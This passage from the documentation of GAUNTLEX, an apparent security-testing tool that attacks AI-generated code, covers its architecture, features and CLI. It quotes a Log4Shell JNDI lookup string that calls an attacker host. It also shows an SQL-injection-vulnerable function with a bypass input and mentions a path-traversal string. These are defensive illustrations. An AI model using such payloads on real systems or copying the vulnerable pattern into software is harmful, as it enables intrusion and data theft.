← [Back to README](../README.md) · [Domain Intelligence](DOMAIN_INTELLIGENCE.md)

# GAUNTLEX — Deep Dive

The full story: why concurrent adversarial testing exists, how it compares to
existing AppSec tooling, the complete CLI and configuration reference,
architecture, and FAQ. The [main README](../README.md) covers what you need to
get started; this page covers why it works and every detail underneath it.

---

## Table of contents

- [The problem that started this](#the-problem-that-started-this)
- [If your team adopted TDD, you already understand why GAUNTLEX exists](#if-your-team-adopted-tdd-you-already-understand-why-gauntlex-exists)
- [The three differentiators, in full](#the-three-differentiators-in-full)
- [The perimeter security fallacy](#the-perimeter-security-fallacy--a-message-for-enterprise-architecture-boards)
- [What "adversarially resilient" actually means](#what-does-adversarially-resilient-ai-generated-code-actually-mean)
- [The twelve levers of resilience](#the-twelve-levers-of-resilience-gauntlex-tests)
- [Why the spec is the right attack surface](#why-the-spec-is-the-right-attack-surface--not-the-code)
- [Why Devin, Copilot, SWE-agent, and OpenHands don't do this](#why-devin-copilot-swe-agent-and-openhands-dont-do-this--and-structurally-cannot)
- [The Adversarial Resilience Score — formal definition](#the-adversarial-resilience-score-ars-a-formal-definition)
- [Why concurrent execution matters](#why-concurrent-matters--the-value-you-are-actually-getting)
- [Features in depth](#features-in-depth)
- [Installation](#installation)
- [GitHub Actions CI/CD](#github-actions--cicd-adversarial-gate)
- [Competitive positioning](#gauntlex-in-the-security-toolchain--competitive-positioning)
- [How GAUNTLEX works](#how-gauntlex-works)
- [Complete CLI reference](#complete-cli-reference)
- [Configuration reference](#configuration-reference)
- [Output formats](#output-formats)
- [Enterprise features](#enterprise-features)
- [Testing](#testing)
- [Development](#development)
- [Contributing](#contributing)
- [Roadmap](#roadmap)
- [FAQ](#faq)

---

## The problem that started this

It is 2026. Your engineering team uses AI coding assistants every day. Features ship faster than they ever have. The code passes CI. PRs get approved. Everything looks fine.

Then your security team runs a penetration test and finds SQL injection in the login endpoint — code that was generated in an afternoon sprint, reviewed in twenty minutes, and merged without anyone asking: *what would an attacker do with this?*

Or your compliance team receives a HIPAA audit notice. An AI-generated API endpoint is returning PHI in error messages. The code never had a human author who would have thought to apply output encoding. The AI followed the spec. The spec didn't mention output encoding. Nobody adversarially tested it.

Or a FINRA examination flags an AML detection gap in a fraud scoring engine. The code is correct by every unit test. But an attacker who understands the spec can craft transactions that slip beneath the detection threshold — and the code, following the spec faithfully, lets them through.

This is not hypothetical. It is happening across every regulated industry — finance, healthcare, government, insurance — right now, at scale.

**The root cause is a distinction almost no one in the industry has named clearly.**

---

## If your team adopted TDD, you already understand why GAUNTLEX exists

Engineering managers who shipped the TDD transition remember the argument: *"We don't have time to write tests."* Then they measured what "no time" actually cost — defects found in QA cost 10× more than defects found in development; defects found in production cost 100× more. Once those numbers were on the table, the conversation changed. TDD was not a cost — it was the cheapest defect-removal process available at the point of creation.

GAUNTLEX applies the same logic to adversarial security:

| | TDD | GAUNTLEX |
|---|---|---|
| **What it attacks** | Functional defects | Security weaknesses |
| **When it runs** | While code is written | While code is generated |
| **What it prevents** | Broken features in QA | Exploitable code in production |
| **Artifact produced** | Test suite | Adversarial Resilience Score + compliance evidence |

The difference is that TDD requires a human to write the test cases. GAUNTLEX generates adversarial attacks from your specification automatically, using the same source of truth your AI coding tool is already reading.

---

## The three differentiators, in full

### ⚔️ 1. The Combat Pair — Builder and Breaker Run at the Same Instant

Every AI coding tool today follows the same sequential pattern: generate code, run tests, maybe run a scanner. The security check happens after the code exists — and after the team has committed to shipping it.

GAUNTLEX's architecture is different at the foundation. The **Builder** (generates code from the spec) and the **Breaker** (generates adversarial attacks from the same spec) are fired simultaneously via `asyncio.gather()`:

```
                         asyncio.gather()
                ┌───────────────────────────────────────┐
                │                                       │
Spec ──────────►│  Builder ──────────────────► Code    │
       │        │                                       │
       └───────►│  Breaker → CWE attacks               │
                │            → Arbiter scores each      │
                │            → ARS = Σ(scores) / N      │
                └───────────────────────────────────────┘
                   Both start at t=0. Both finish together.
```

The Breaker does not read the generated code. It reads the **specification** — the same source of truth the Builder uses — and asks: *"Given what this code is supposed to do, what would a motivated attacker try?"* SQL injection, SSRF, broken authorization, deserialization attacks — 12 CWE categories, weighted by language and business domain.

By the time the Builder finishes, you have code **and** an Adversarial Resilience Score **and** a tamper-evident Resilience Report. ARS below the gate threshold with `fail_open: false` blocks the CI pipeline. Not an advisory. A hard gate.

### 🔌 2. A Native MCP Integration, Both Directions

GAUNTLEX both **exposes** an MCP server (so your IDE can trigger and poll runs) and **consumes** external MCP servers plus two free live-CVE feeds (so every run is enriched with current threat data). These are two independent mechanisms — full detail, including exactly which IDEs are confirmed supported for which purpose, is in [Domain Intelligence → GAUNTLEX as an MCP server vs. consumer](DOMAIN_INTELLIGENCE.md#gauntlex-as-an-mcp-server-vs-gauntlex-as-an-mcp-consumer).

**One config line to add it to Claude Code** (`~/.claude/mcp_servers.json`):

```json
{
  "mcpServers": {
    "gauntlex": { "command": "gauntlex", "args": ["mcp-server"] }
  }
}
```

Once added, five tools appear in your coding tool:

```
gauntlex_run         — fire adversarial assessment; returns run_id in <1s
gauntlex_status      — poll for ARS score and attack breakdown
gauntlex_vault_stats — how many adversarial patterns your Forge has learned
gauntlex_policy_list — list available security domain playbooks
gauntlex_verify      — verify SHA-256 integrity of any Resilience Report
```

What this looks like in practice inside Claude Code:

```
You:        "Run a GAUNTLEX quick assessment on this payment API spec"

GAUNTLEX:   Adversarial assessment started.
            run_id: gauntlex-mcp-a1b2c3d4  (mode: quick — 5 attacks)

            [some time later — depends on your configured model provider]

You:        "Check results"

GAUNTLEX:   ARS: 0.83  ✅ PASSED  (gate: ≥ 0.80)
            Attacks: 5 total · 1 missed

            ✅ CWE-89    SQL injection via login form        score: 1.0
            ✅ CWE-79    Reflected XSS in error response     score: 1.0
            ❌ CWE-918   SSRF via payment redirect URL       score: 0.0  ← missed
            ✅ CWE-287   Broken auth — weak token entropy    score: 1.0
            ✅ CWE-862   Missing object-level authorization  score: 1.0
```

`gauntlex_run` fires an `asyncio.Task` and returns the `run_id` immediately, because a full run can take anywhere from under a minute to several minutes depending on mode and model provider — far longer than MCP's interactive-use expectations. `gauntlex_status` polls until it's done. For team deployments, `gauntlex serve --mcp` exposes the same tools over HTTP alongside the GAUNTLEX Dashboard, so a whole team can share one GAUNTLEX instance.

### 🌐 3. Regulatory Domains and Live Threat Enrichment as First-Class Input

The Breaker does not attack in a vacuum. Before each run, the **Domain Intelligence Adapter (DIA)** can enrich its policy context with live exploit data (CISA KEV — always on, free; NIST NVD — opt-in) plus whichever policy domain you select (FINRA, HIPAA, PCI DSS, SOC 2, OWASP Top 10, and more via Policy Hub or your own YAML).

```
--- Live threat intelligence from CISA KEV ---
CVE-2023-34362 (Progress MOVEit Transfer) [ransomware-linked] added:2023-06-01
  SQL injection allows unauthenticated remote code execution

CVE-2021-26855 (Microsoft Exchange Server) added:2021-03-02
  Server-side request forgery allows unauthorized internal network access
```

The Breaker uses this context to generate *timely, realistic* attack scenarios — not just textbook patterns. When a vulnerability class is fresh in the KEV feed, the Breaker's payloads for that CWE reflect how that class was actually exploited.

**This page intentionally does not repeat domain scenario counts or "what's live vs. static" here** — that lives in one authoritative place: **[Domain Intelligence](DOMAIN_INTELLIGENCE.md)**, kept accurate against the actual policy YAML files rather than restated (and risking drift) across multiple documents.

---

## The Perimeter Security Fallacy — A Message for Enterprise Architecture Boards

> *"Our infrastructure is secure. Private cloud. SSO everywhere. VPN-enforced endpoint control. All API traffic runs through our WAF. We've never had a perimeter breach. Why do we need to think about application-level security in generated code?"*

This is the most important question an enterprise architecture review board will ask. It deserves a direct, grounded, evidence-based answer — not a sales pitch.

**The short answer:** Application-layer vulnerabilities do not require a perimeter breach to cause a catastrophic incident. The incidents that have cost regulated financial and healthcare organizations billions of dollars in the last five years exploited code-level weaknesses — inside perfectly intact network perimeters, in environments with every enterprise security control in place.

Let's look at the evidence.

### What the incidents actually tell us

**MOVEit Transfer — 2023 (CVE-2023-34362)**

MOVEit Transfer was an enterprise managed file transfer solution used by banks, insurance companies, healthcare systems, and government agencies. These organizations had network perimeters, VPCs, VPNs, and enterprise access controls. The attack did not breach any of those controls.

Instead, it exploited a **SQL injection vulnerability in the application code** — CWE-89, the same class of vulnerability that appears in the OWASP Top 10 every year. A single untrusted input flowing into a SQL statement without parameterization. No network breach required. The attacker queried an API endpoint accessible through the normal application path.

Result: **2,700 organizations compromised. 93.3 million individual records exposed. Estimated cost: $15.8 billion** (based on IBM's $165/record average breach cost). Victims included organizations across healthcare (20% of victims), finance and professional services (13%), and government. Every one of those organizations had a network perimeter.

**Capital One — 2019**

Capital One operated on AWS — one of the most security-reviewed cloud environments in the industry. They used VPCs, IAM policies, security groups, and all standard AWS enterprise controls. The network was not breached.

The attack exploited a **Server-Side Request Forgery (SSRF) vulnerability** — CWE-918 — in a misconfigured web application firewall running as an EC2 instance. The attacker sent an HTTP request to the WAF, which the WAF's application code forwarded to the AWS EC2 metadata service at `169.254.169.254`. The metadata service returned IAM credentials. From there, the attacker accessed S3 buckets containing the data of 106 million customers.

The network perimeter was intact. The VPC was intact. IAM policies were applied. The application code — specifically the WAF's request processing logic — was the attack surface.

**Log4Shell — 2021 (CVE-2021-44228, CVSS 10.0)**

Log4Shell was a remote code execution vulnerability in Apache Log4j — a logging library used in millions of Java applications worldwide. The vulnerability was not at the network layer. It was at the application layer: when a Java application logged a string containing a user-controlled value, Log4j would attempt to resolve JNDI lookups embedded in that string. If the string contained `${jndi:ldap://attacker.com/exploit}`, Log4j would connect to the attacker's server and execute arbitrary Java code.

The implications for regulated industries: **93% of enterprise cloud environments were vulnerable**, according to Wiz and EY. Financial institutions running Java-based trading systems, database connectors, and banking middleware were equally exposed — regardless of their network architecture. A user-controlled string reaching any log statement was the attack vector. No perimeter crossing required.

IBM's banking and financial markets data warehouse products were explicitly affected. Ten days after disclosure, only 45% of vulnerable workloads had been patched — meaning regulated institutions were exposed for weeks, through no failure of their network security.

**SolarWinds Orion — 2020**

The SolarWinds attack did not begin with a network breach. It began in the **software build process** — application code. Attackers compromised SolarWinds' build pipeline and inserted the SUNBURST backdoor into a legitimate software update. When the signed, trusted update was installed by SolarWinds customers — financial institutions, government agencies, defense contractors — the backdoor entered their environments through the exact channel their security controls were designed to trust.

The backdoor then operated inside those environments for months, communicating via normal-looking HTTPS traffic. The perimeter security of affected organizations was not circumvented. It was rendered irrelevant, because the threat originated from application code in a trusted software component.

### Why strong perimeter security creates a false sense of assurance

The incidents above share a structural pattern that security architects need to internalize:

**Perimeter security controls the channel.** It determines who can knock on the door and through what protocol. It does not determine what happens to the input once the door is opened.

When an authenticated, VPN-connected, SSO-verified user submits a request to your application, every perimeter control has done its job. The request is legitimate from the network's perspective. What happens next — how the application processes that input — is entirely determined by application code. SQL parameters, HTML encoding, file path validation, object deserialization handling, authorization checks: none of these are performed by the network. All of them are performed by code.

This is why **every major security framework explicitly requires application-layer security testing regardless of network controls:**

- **PCI DSS 4.0, Requirement 6.3.2:** Maintain an inventory of all bespoke and custom software. Require documented security training for developers. Requirement 11.3 mandates penetration testing of all in-scope components — including applications — at least once every 12 months and after significant changes.
- **NIST SP 800-218 (SSDF):** Explicitly requires secure software development practices at the code level as distinct from and complementary to infrastructure security. PW.4 specifically requires input validation and output encoding; RV.2 requires vulnerability identification in produced software.
- **FFIEC (Federal Financial Institutions Examination Council):** Includes application security as a distinct supervisory domain, separate from network and infrastructure controls.

These are not suggestions. For regulated financial and healthcare institutions, they are compliance requirements.

### The insider threat reality

A strong network perimeter is entirely irrelevant to insider threats. **Over 70% of financial services firms face significant insider threat risk**, and the average insider incident now costs $16.2 million. An authenticated employee with legitimate system access can probe your application endpoints for authorization gaps, IDOR vulnerabilities, and data exposure — from inside the perimeter, with valid credentials, through channels your WAF allows without question.

Application-layer controls — authorization checks, object-level access validation, row-level security, principle of least privilege in code — are the only defenses against insider threats. The network sees an authenticated request and lets it through. The code decides whether the authenticated user is authorized to access *this specific resource*.

### The AI code multiplier — why this matters more than it did in 2019

Everything above predates the AI coding assistant era. In 2024–2026, the risk profile changed structurally.

A 2022 empirical study (Pearce et al.) found that GitHub Copilot generated code with security vulnerabilities in approximately 40% of security-sensitive scenarios. For SQL injection specifically (CWE-89 — the MOVEit vulnerability class), vulnerability rates in specific scenarios reached 65–75%. A more recent 2024 analysis found approximately 30% of Copilot-generated code snippets contain security weaknesses across 43 CWE categories.

In 2025, the Cloud Security Alliance published research documenting:
- AI-assisted commits expose hardcoded secrets at **twice the rate** of human-written code (3.2% vs 1.5%)
- In testing of five major AI coding agents, **every single one** introduced SSRF vulnerabilities in apps with URL-handling features
- Georgetown CSET found **XSS vulnerabilities in 86% of AI-generated code samples** tested across five major LLMs
- CVEs formally attributed to AI-generated code grew from 6 in January 2026 to 35 in March 2026 — and researchers estimate the actual count is 5–10× higher

A SecurityWeek analysis documented a **10× increase in security findings per month** within Fortune 50 enterprises between December 2024 and June 2025 — from approximately 1,000 to over 10,000 monthly vulnerabilities — correlating directly with the adoption of AI coding agents.

The pattern is not that AI writes uniquely dangerous code. The pattern is that **AI writes what the spec says, at a volume and velocity that has fundamentally outpaced the security review capacity of any human team.**

### The practical synthesis for architecture review boards

1. **Your network security is necessary.** Keep it. Strengthen it. It is one layer of a required stack.
2. **Your network security does not protect against CWE-89, CWE-79, CWE-918, CWE-502**, or any of the vulnerability classes that caused the MOVEit, Capital One, and Log4Shell incidents. These vulnerabilities are resolved by application code — or not resolved, if the AI generating that code didn't think to apply the defense.
3. **Every framework you are regulated by** — PCI DSS, NIST SSDF, HIPAA Security Rule, FFIEC — explicitly requires application-layer security controls as a separate compliance domain from network controls.
4. **The AI coding agent adoption your organization has made has increased your application-layer risk surface** at a rate human security review cannot match.

GAUNTLEX is a mechanism for the layer network security cannot reach — it does not replace network security, and it is not a substitute for the tools covered in [Competitive Positioning](#gauntlex-in-the-security-toolchain--competitive-positioning) below.

---

## What Does "Adversarially Resilient AI-Generated Code" Actually Mean?

### Functional correctness vs. adversarial resilience

When we say code is **functionally correct**, we mean: it does what the spec says.

The spec says "authenticate users." The AI generates an authentication function. Tests pass. PR merges. ✓

When we say code is **adversarially resilient**, we mean something fundamentally different: the code holds up when a motivated, intelligent attacker deliberately tries to make it misbehave — including attacks that the spec never mentioned, attacks that no unit test covers.

A single endpoint can be **functionally correct and adversarially empty at the same time**:

```python
# Spec: "Accept a username and return the user's profile"
# Generated code: functionally correct — it returns the profile

def get_profile(username):
    query = f"SELECT * FROM users WHERE name = '{username}'"  # CWE-89
    result = db.execute(query)
    return result.fetchone()
```

This code does exactly what the spec says. Every functional test passes. But an attacker who sends `username = "' OR '1'='1"` now owns your entire users table. The spec said nothing about SQL injection. The AI had no reason to know it should parameterize the query.

### The three properties of adversarial resilience

**1. Completeness of defense** — the code defends against the *full threat model implied by its business context*, not just the attacks the developer happened to think of while writing it.

**2. Correctness of defense** — having a defense is not enough if it is bypassable. GAUNTLEX scores partial defenses at 0.5, not 1.0, because a partial defense gives false confidence.

**3. Depth of defense** — security controls must be applied at the right layers. The Breaker probes for defense-in-depth failures: does every path from untrusted input to sensitive operation have a checkpoint?

### Why AI models have a structural weakness here

Security invariants that every experienced engineer knows are **implicit, unstated, and domain-specific** — "every string that touches a database must be parameterized," "every user-controlled value rendered in HTML must be encoded." None of these are typically in the spec. The AI faithfully implements what is written; it has no ambient threat model.

---

## The Twelve Levers of Resilience GAUNTLEX Tests

GAUNTLEX's Breaker probes generated code against twelve categories of adversarial attack, selected and weighted by the language and business domain detected from the specification.

### 1. Injection Resistance (CWE-89, CWE-78, CWE-94, CWE-1343)
Does the generated code safely handle user-controlled data that flows into interpreters — SQL, OS shell, `eval()`, LDAP, XPath, template engines?

### 2. Output Encoding (CWE-79, CWE-116)
Does the generated code encode data in the correct context before outputting it — HTML, URL, JSON?

### 3. Authentication Integrity (CWE-287, CWE-384, CWE-798)
No hardcoded credentials, no predictable tokens, no session fixation, no credential exposure in logs.

### 4. Authorization Correctness (CWE-285, CWE-862, CWE-863, CWE-639)
Not just "is this user authenticated?" but "is this specific user authorized to access this specific resource?" — BOLA is the most commonly missed pattern in AI-generated code.

### 5. Deserialization Safety (CWE-502)
Safe handling of serialized data — pickle, YAML with `yaml.load()`, Java object deserialization, XML entity expansion — from untrusted sources.

### 6. Path Traversal and File System Safety (CWE-22, CWE-73)
Prevents `../../etc/passwd`-style traversal in file uploads, downloads, log viewers, config readers.

### 7. Cryptographic Correctness (CWE-327, CWE-321, CWE-330, CWE-311)
Strong algorithms, properly random values, correctly hashed credentials, no hardcoded secrets.

### 8. Race Condition and Concurrency Safety (CWE-362, CWE-367)
Protects shared state against time-of-check/time-of-use races — common in AI-generated async Python, Go goroutines, and JS Promise chains.

### 9. Prototype Pollution (CWE-1321 — JavaScript/TypeScript only)
Can an attacker inject properties into `Object.prototype` via `merge()`/`extend()`/`clone()`-style functions?

### 10. Server-Side Request Forgery (CWE-918)
Can an attacker cause outbound requests to internal network resources — metadata services, internal APIs?

### 11. Resource Exhaustion and DoS (CWE-770, CWE-674, CWE-407)
Unbounded loops, infinite recursion, memory allocation from user-controlled size, ReDoS.

### 12. Sensitive Data Exposure (CWE-200, CWE-532, CWE-359)
Avoids leaking sensitive data in error messages, logs, API responses, or headers.

---

## Why the Spec Is the Right Attack Surface — Not the Code

Static analysis (Bandit, Semgrep, CodeQL) reads the **generated code** and pattern-matches against known bad patterns. Valuable, but bounded: it only finds what it was programmed to look for.

GAUNTLEX's Breaker reads the **specification**. It asks: "Given what this code is *supposed to do*, what would a motivated attacker *try to do with it*?" — a different question, and the one that matters for security.

1. **The spec defines the trust boundary.** "Accept user input" is the trust boundary declaration.
2. **The spec implies the business domain.** "HIPAA patient portal" implies PHI protection even if the spec never says "protect PHI."
3. **The spec survives implementation changes.** Refactor the code and GAUNTLEX's attacks against the spec remain valid — they test intent, not implementation.
4. **The spec is where AI hallucination risk concentrates.** The Breaker tests the exact assumptions the AI had to infer.

---

## Why Devin, Copilot, SWE-Agent, and OpenHands Don't Do This — And Structurally Cannot

The answer is not that other tools are behind — they are solving a different problem with a different optimization target.

**Copilot** and inline completion tools optimize for developer velocity: complete the current line as fast as possible. The security signal available to an inline autocomplete model is zero.

**Devin, SWE-agent, OpenHands** optimize for task completion: does the code pass the tests, does the PR get merged? Neither metric has an adversarial component.

**Why they can't add it without fundamental architectural change** — it requires all of:

1. A **second agent** (the Breaker) that runs *concurrently* and reasons from the specification, not the generated code
2. An **Arbiter** that scores each attack in a domain-aware way
3. A **persistent adversarial memory** (Knowledge Forge) carrying forward what was learned across future runs
4. A **gate mechanism** that can block CI/CD pipelines based on the adversarial score
5. **Compliance artifact generation** mapping attacks to regulatory control frameworks

None of these are features you bolt onto a sequential code generator — they require the adversarial loop to be the architectural primitive.

---

## The Adversarial Resilience Score (ARS): A Formal Definition

```
ARS = Σ(attack_scores) / N

where:
  N            = number of attacks actually fired, targeting 5/20/50 by mode
                 (quick/standard/thorough) — see the mode table above
  attack_score = 1.0  if the generated code correctly mitigates the attack
               = 0.5  if a partial defense exists but is bypassable or incomplete
               = 0.0  if no defense exists — an attacker would succeed

ARS range: [0.0, 1.0]
```

**ARS is not a test pass rate.** A test pass rate measures whether the code does what it should. ARS measures whether the code holds up against what it should *not* allow. Code can be 100% test-passing and 0.0 ARS simultaneously.

**ARS is tamper-evident.** Every report carries a SHA-256 hash over the ordered attack array. `gauntlex verify <run_id>` re-derives this hash at any future point.

**ARS is a gate, not a suggestion.** With `fail_open: false`, ARS below `minimum_ars` causes `gauntlex run` to exit 1 — blocking the CI pipeline.

---

## Why Concurrent Matters — The Value You Are Actually Getting

> *"You could test security after the build. So why does it matter that GAUNTLEX attacks at the same time as generation?"*

The answer is **not about speed**. Concurrent execution provides value sequential execution cannot provide, regardless of how fast the sequential approach is.

### The difference is not time — it is the attack surface

A scanner that runs **after** code is built attacks the **implementation** — what the AI decided to do. GAUNTLEX's Breaker, running concurrently from the **specification**, attacks the **intent** — what the system was supposed to do. Attackers attack intent, not implementation.

### The anchoring problem that sequential testing cannot escape

A human reviewer (or a post-build scanner) who sees code first unconsciously anchors to "what does this code do?" GAUNTLEX's Breaker **never sees the generated code** — it reasons purely from the specification, without any anchor to the Builder's implementation choices.

### The commitment trap — why post-build security review fails in practice

By the time a security review runs on generated code: the AI generated it, a developer approved the PR, CI passed, and the team has moved on. A vulnerability found now requires a new PR, a re-context-switch, a new review cycle — under timeline pressure, because the feature was "already done." In practice, findings from post-build review get negotiated, deferred, or closed as "acceptable risk" at a rate pre-commit findings simply are not. GAUNTLEX catches findings before the first commit exists — there is no sunk cost to overcome.

### The "same timestamp" proof — concurrency creates a causal chain

When Builder and Breaker run against the same spec at the same timestamp, every attack in the Forge Ledger is causally linked to a specific generation event. A compliance team can say: "When we generated this code on this date, it achieved this ARS against N adversarial attacks, verified by this SHA-256 hash." No post-build scanner can produce a score causally linked to the act of generation.

### The NIST cost curve — why the moment of attack matters

| Phase detected | Avg remediation cost |
|---------------|---------------------|
| Design / spec | $60 |
| Implementation | $500 |
| Code review | $2,000 |
| QA / test | $5,000 |
| Production | $30,000 – $300,000 |

Traditional security testing operates at code review or QA. GAUNTLEX operates at the design/implementation boundary. The cost difference is not a multiplier — it is an order of magnitude.

### What concurrent execution is NOT

- **Not a replacement for penetration testing.** Human pentesters with full system access will always discover attacks GAUNTLEX misses.
- **Not a SAST/DAST replacement.** GAUNTLEX does not scan your existing codebase; it adversarially tests each spec-to-code generation event.
- **Not faster security testing.** It is a different operation — adversarial specification review — at a different point in the pipeline.

### Summary — the six structural advantages of concurrent adversarial testing

| Property | Post-Build Security Testing | GAUNTLEX Concurrent Testing |
|----------|---------------------------|---------------------------|
| **Attack surface** | Implementation (code as-is) | Specification (intent, same surface as real attackers) |
| **Anchoring bias** | Scanner / reviewer anchored to code | Breaker never sees code — pure adversarial reasoning |
| **Timing** | After commit, after review, after PR | Before first commit exists |
| **Causal linkage** | Score of code (post-hoc) | Score of generation event (causal, tamper-evident) |
| **Learning** | Generic CVE patterns | Forge recalls patterns specific to your spec type |
| **Economic moment** | Code review / QA phase ($2K–$5K/finding) | Design/implementation boundary ($60/finding) |

---

## Features in depth

### Feature 1 — The Gauntlex Engine

Sequential security testing is fundamentally reactive — by the time you run a scanner, the code already exists, is often already reviewed, sometimes already merged. The Gauntlex runs Builder and Breaker concurrently against the same spec using `asyncio.gather()`. When both finish, the Arbiter scores every attack and produces the ARS.

| Mode | Attacks (target) | Use case |
|------|---------|---------|
| `quick` | 5 | Every PR, fast feedback loop |
| `standard` | 20 | Pre-merge gate, standard CI |
| `thorough` | 50 | Release branches, compliance audits |

The attack count is spread across `rounds_max` adversarial rounds as a
per-round target, not guaranteed exactly — actual totals typically land
close to but not always at the target (early-exit and how many attacks the
model returns per round both affect the final count).

Wall-clock time and API cost scale with attack count and depend entirely on your configured model provider — see [Model Options](../README.md#requirements) in the README.

```bash
gauntlex run --issue spec.md --mode standard --pretty
```

### Feature 2 — The Knowledge Forge

Every time a new AI coding tool runs, it starts cold. After every GAUNTLEX run, every scored attack is written into the **Knowledge Forge** — a [ChromaDB](https://www.trychroma.com/) vector database embedded in `.gauntlex/forge/`. On the next run, the Breaker recalls the most semantically similar past attacks for this codebase fingerprint and starts from a higher adversarial baseline — a learning curve rather than a cold start every time.

The Forge is local by default — fully air-gapped, no data leaves your environment, unless you opt into the [Forge Network](#feature-11--forge-network-opt-in-community-pattern-sharing).

```bash
gauntlex stats --learning-curve   # visualize the compound improvement
gauntlex stats --by-cwe           # ARS breakdown by vulnerability category
gauntlex stats --days 90          # 90-day trend
```

### Feature 3 — The Forge Ledger

ChromaDB is powerful for similarity search but opaque to human readers. The **Forge Ledger** is a human-readable Markdown vault alongside the Knowledge Forge — every attack from every run written as an individual Markdown file with YAML frontmatter at `.gauntlex/vault/<CWE-XXX>/<slug>.md`, readable in any text editor, diffable in a PR, attachable to a compliance ticket.

```bash
gauntlex vault --stats                          # aggregate stats
gauntlex vault --cwe CWE-89 --format md         # Markdown table, filtered by CWE
```

### Feature 4 — Language Profiles and Spec Fingerprinting

A generic "run all attacks" approach wastes rounds on CWEs that don't apply to the target language — prototype pollution against a Java service, nil-pointer dereference against a Python REST API. GAUNTLEX fingerprints the specification first — detecting language and surface signals from the spec text, never from generated code. Detection runs in priority order: TypeScript → JavaScript → Java → Go → Python.

| Language | Priority CWEs | Key attack context |
|----------|-------------|-------------------|
| **JavaScript** | CWE-1321, CWE-79, CWE-94, CWE-352, CWE-601, CWE-918, CWE-362, CWE-346 | Prototype pollution, eval injection, CORS |
| **TypeScript** | JS CWEs + CWE-285 | Typed but still runtime-vulnerable |
| **Python** | CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330 | SQLi, pickle, path traversal, XXE |
| **Java** | CWE-89, CWE-502, CWE-78, CWE-611, CWE-918, CWE-863, CWE-362, CWE-22 | Deserialization, XXE, Spring auth gaps |
| **Go** | CWE-89, CWE-78, CWE-362, CWE-476, CWE-22, CWE-918, CWE-770, CWE-674 | Race conditions, nil deref, goroutine leaks |

Beyond language, GAUNTLEX detects surface signals that select sub-profiles: async/Promise patterns prioritize race conditions; filesystem access prioritizes path traversal; `eval`/dynamic exec prioritizes injection; React/Next.js prioritizes XSS and CORS; NestJS/Spring prioritizes authentication and BOLA; Go web frameworks prioritize SSRF and resource exhaustion.

### Feature 5 — BreakContext Token Compression

In thorough mode with 50 attacks and a rich Forge recall, naive prompts can exceed 40,000 tokens per attack. **BreakContext** applies three compression algorithms to Breaker *inputs only* — the Arbiter never sees compressed data, preserving scoring accuracy:

1. **Target compression** — extracts security-relevant lines (auth, validation, DB calls, file I/O, crypto, authorization) plus a ±2 line window; always keeps the first 10 lines.
2. **Forge recall deduplication** — removes past attacks with >65% Jaccard word overlap; retained attacks truncated to 250 characters.
3. **CWE context collapsing** — multi-line CWE descriptions collapsed to single lines capped at 120 characters.

Enabled by default; disable per-project in `.gauntlex.yml`:

```yaml
gauntlex:
  break_context_enabled: false   # disable for maximum Breaker context fidelity
```

### Feature 6 — Adversarial Policy Engine (APE) + Policy Hub

A generic OWASP Top 10 scan gives generic results. A healthcare company's threat model is different from a fintech's threat model. The **Adversarial Policy Engine** loads YAML domain playbooks that encode domain-specific threat scenarios, regulatory control mappings, and CWE priorities — passed to the Breaker as policy context.

```bash
gauntlex run --issue patient_api_spec.md --mode standard --domain hipaa --pretty
```

For exactly which domains exist today, their real scenario counts, and how to add your own — see **[Domain Intelligence](DOMAIN_INTELLIGENCE.md)**, the single source of truth for this, rather than repeating a table here that could drift out of sync.

```bash
gauntlex policy list                            # all available domains
gauntlex policy hub                             # browse community-contributed domains
gauntlex policy install owasp_api_security      # install one
gauntlex policy search "broker dealer"          # search by tag or keyword
```

### Feature 7 — SARIF 2.1.0, JUnit XML, and HTML Resilience Reports

GAUNTLEX emits three output formats simultaneously from every run, each for a different audience:

- **SARIF 2.1.0 → GitHub Code Scanning.** Every missed attack appears as an open security alert in Security → Code Scanning.
- **JUnit XML → CI dashboards.** Every attack becomes a test case — mitigated passes, missed fails with a descriptive message. Works with GitHub Actions, Jenkins, GitLab CI, CircleCI.
- **HTML Resilience Report → compliance evidence.** A self-contained document with the full run summary, attack table, control mappings, and tamper-evident hash.

```bash
gauntlex run --issue spec.md --output-sarif gauntlex.sarif --output-junit gauntlex.xml
gauntlex report <run_id> --format html > report.html
```

### Feature 8 — GAUNTLEX Dashboard

For a security team managing many repositories and hundreds of runs per week: a centralized ARS trend, gate pass/fail history, and evidence download, in a browser.

```bash
pip install "gauntlex-ai[ui]"
gauntlex dashboard --port 8080
```

Exposes a REST API (`/api/runs`, `/api/runs/{id}`) for integration with existing dashboards (Grafana, Splunk, Datadog) via standard HTTP.

### Feature 9 — ARS Leaderboard — Benchmarking AI Coding Agents

SWE-bench measures whether an agent fixed the bug — not whether the fix introduced new vulnerabilities. Score multiple AI agents against the same task set and rank by adversarial resilience:

```bash
gauntlex leaderboard --reports-dir .gauntlex/reports --output docs/leaderboard.html
```

Rank score = `avg_ARS × 0.6 + pass_rate × 0.4`. Output is a self-contained, sortable HTML page — publish to GitHub Pages. A JSONL input format is also supported for importing scores from external tools.

### Feature 10 — Enterprise RBAC (GitHub Team-Based Access Control)

Not everyone sharing a GAUNTLEX instance should have the same permissions. Three roles, mapped to GitHub team membership, cached 5 minutes; role lookups degrade gracefully to `DEVELOPER` (least privilege) on API unavailability.

| Role | Capabilities | Env var |
|------|-----------------|---------------------|
| **Admin** | Manage policies, configure ARS gate, manage team assignments | `GAUNTLEX_ADMIN_TEAMS` |
| **Reviewer** | Trigger re-runs, override gate on individual PRs | `GAUNTLEX_REVIEWER_TEAMS` |
| **Developer** | View reports, download evidence (read-only) | `GAUNTLEX_DEV_TEAMS` (default: any authenticated user) |

```bash
export GAUNTLEX_RBAC_ENABLED=true
export GITHUB_ORG=your-org
export GAUNTLEX_ADMIN_TEAMS=security-leads,platform-admin
export GAUNTLEX_REVIEWER_TEAMS=backend-leads,security-review
```

### Feature 11 — Forge Network (Opt-In Community Pattern Sharing)

The Knowledge Forge learns from your runs — but only your runs, by default. The **Forge Network** lets you share anonymized attack patterns with the community and receive patterns discovered by others.

**Shared:** the attack vector description (text only, ≤500 characters), CWE identifier, severity, verdict, target language.
**Never shared:** your code, your specification, your repository name, your organization, or any personally identifiable information.

A stable 16-character anonymous contributor ID (SHA-256 of your git remote URL) identifies contributions.

```bash
export GAUNTLEX_FORGE_NETWORK_ENABLED=true
gauntlex forge-network status
gauntlex forge-network pull CWE-89
```

### Feature 12 — Slack + Jira Alerts on Low-ARS Runs

